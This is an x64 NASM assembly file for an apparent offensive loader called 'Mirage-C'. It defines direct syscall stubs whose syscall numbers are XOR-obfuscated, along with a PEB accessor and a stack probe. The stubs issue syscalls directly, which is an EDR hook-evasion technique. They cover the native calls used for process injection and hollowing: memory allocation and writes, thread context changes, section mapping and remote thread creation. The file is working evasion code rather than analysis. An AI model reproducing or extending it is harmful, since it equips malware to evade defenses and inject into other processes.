; mirage_stubs_v2.asm - NASM stubs for Mirage-C x64 Windows (VARIANT 2)
; Hardcoded syscall;ret in each stub — no gadget_pool jumps.
;
; Provides:
;   getPeb()           - Read PEB from GS:[0x60]
;   ssn_*              - SSN storage (written by C engine, read by stubs)
;   Nt*_stub()         - Direct syscall stubs (load SSN, XOR, syscall, ret)

bits 64
default rel

; ════════════════════════════════════════════════════════════════
; PEB ACCESS
; ════════════════════════════════════════════════════════════════

section .text

global getPeb
getPeb:
    mov rax, qword [gs:0x60]
    ret

; ════════════════════════════════════════════════════════════════
; __chkstk_ms — stack probe (required with -nostdlib)
; rax holds the frame size; probes in 4KB pages.
; ════════════════════════════════════════════════════════════════

global ___chkstk_ms
___chkstk_ms:
    push rcx
    push rax
    cmp rax, 0x1000
    lea rcx, [rsp+24]
    jb  .done
.probe:
    sub rcx, 0x1000
    test dword [rcx], 0
    sub rax, 0x1000
    cmp rax, 0x1000
    ja  .probe
.done:
    sub rcx, rax
    test dword [rcx], 0
    pop rax
    pop rcx
    ret

; ════════════════════════════════════════════════════════════════
; DATA SECTION - SSN storage variables
; ════════════════════════════════════════════════════════════════

section .data

extern ssn_xor_key

%macro DEF_SSN 1
    global ssn_%1
    ssn_%1: dd 0
%endmacro

DEF_SSN NtAllocateVirtualMemory
DEF_SSN NtProtectVirtualMemory
DEF_SSN NtFreeVirtualMemory
DEF_SSN NtWriteVirtualMemory
DEF_SSN NtClose
DEF_SSN NtOpenFile
DEF_SSN NtReadVirtualMemory
DEF_SSN NtCreateSection
DEF_SSN NtMapViewOfSection
DEF_SSN NtQueryInformationProcess
DEF_SSN NtCreateFile
DEF_SSN NtWriteFile
DEF_SSN NtQuerySystemInformation
DEF_SSN NtDelayExecution
DEF_SSN NtCreateEvent
DEF_SSN NtWaitForSingleObject
DEF_SSN NtOpenKey
DEF_SSN NtQueryValueKey
DEF_SSN NtSetInformationProcess
DEF_SSN NtSetInformationFile
; ssn_NtUserGetSystemMetrics REMOVED — win32u.dll syscall, unresolvable from ntdll
DEF_SSN NtGetContextThread
DEF_SSN NtSetContextThread
DEF_SSN NtOpenSection
DEF_SSN NtUnmapViewOfSection
DEF_SSN NtCreateThreadEx
DEF_SSN NtOpenProcess
DEF_SSN NtResumeThread
DEF_SSN NtSuspendThread
DEF_SSN NtDeleteFile
DEF_SSN NtFlushInstructionCache

; ════════════════════════════════════════════════════════════════
; GADGET POOL (kept for engine.c compatibility, unused by stubs)
; ════════════════════════════════════════════════════════════════

global gadget_pool
gadget_pool: times 64 dq 0

; ════════════════════════════════════════════════════════════════
; SYSCALL STUBS (VARIANT 2 - hardcoded syscall;ret)
; Each stub:
;   1. mov r10, rcx  (Windows ABI: first arg in rcx -> r10 for syscall)
;   2. Load SSN from memory
;   3. XOR deobfuscate with 0xA3B5C7D9
;   4. syscall;ret directly — no gadget_pool
; ════════════════════════════════════════════════════════════════

section .text

%macro SYSCALL_STUB 2
    ; %1 = stub function name
    ; %2 = ssn variable name
    global %1
    %1:
        mov r10, rcx
        mov eax, dword [rel ssn_%2]
        xor eax, dword [rel ssn_xor_key]
        syscall
        ret
%endmacro

SYSCALL_STUB NtAllocateVirtualMemory_stub, NtAllocateVirtualMemory
SYSCALL_STUB NtProtectVirtualMemory_stub, NtProtectVirtualMemory
SYSCALL_STUB NtFreeVirtualMemory_stub, NtFreeVirtualMemory
SYSCALL_STUB NtWriteVirtualMemory_stub, NtWriteVirtualMemory
SYSCALL_STUB NtClose_stub, NtClose
SYSCALL_STUB NtOpenFile_stub, NtOpenFile
SYSCALL_STUB NtReadVirtualMemory_stub, NtReadVirtualMemory
SYSCALL_STUB NtCreateSection_stub, NtCreateSection
SYSCALL_STUB NtMapViewOfSection_stub, NtMapViewOfSection
SYSCALL_STUB NtQueryInformationProcess_stub, NtQueryInformationProcess
SYSCALL_STUB NtCreateFile_stub, NtCreateFile
SYSCALL_STUB NtWriteFile_stub, NtWriteFile
SYSCALL_STUB NtQuerySystemInformation_stub, NtQuerySystemInformation
SYSCALL_STUB NtDelayExecution_stub, NtDelayExecution
SYSCALL_STUB NtCreateEvent_stub, NtCreateEvent
SYSCALL_STUB NtWaitForSingleObject_stub, NtWaitForSingleObject
SYSCALL_STUB NtOpenKey_stub, NtOpenKey
SYSCALL_STUB NtQueryValueKey_stub, NtQueryValueKey
SYSCALL_STUB NtSetInformationProcess_stub, NtSetInformationProcess
; NtUserGetSystemMetrics_stub REMOVED (win32u.dll — see engine.c)
SYSCALL_STUB NtGetContextThread_stub, NtGetContextThread
SYSCALL_STUB NtSetContextThread_stub, NtSetContextThread
SYSCALL_STUB NtOpenSection_stub, NtOpenSection
SYSCALL_STUB NtUnmapViewOfSection_stub, NtUnmapViewOfSection
SYSCALL_STUB NtCreateThreadEx_stub, NtCreateThreadEx
SYSCALL_STUB NtOpenProcess_stub, NtOpenProcess
SYSCALL_STUB NtResumeThread_stub, NtResumeThread
SYSCALL_STUB NtSuspendThread_stub, NtSuspendThread
SYSCALL_STUB NtDeleteFile_stub, NtDeleteFile
SYSCALL_STUB NtFlushInstructionCache_stub, NtFlushInstructionCache
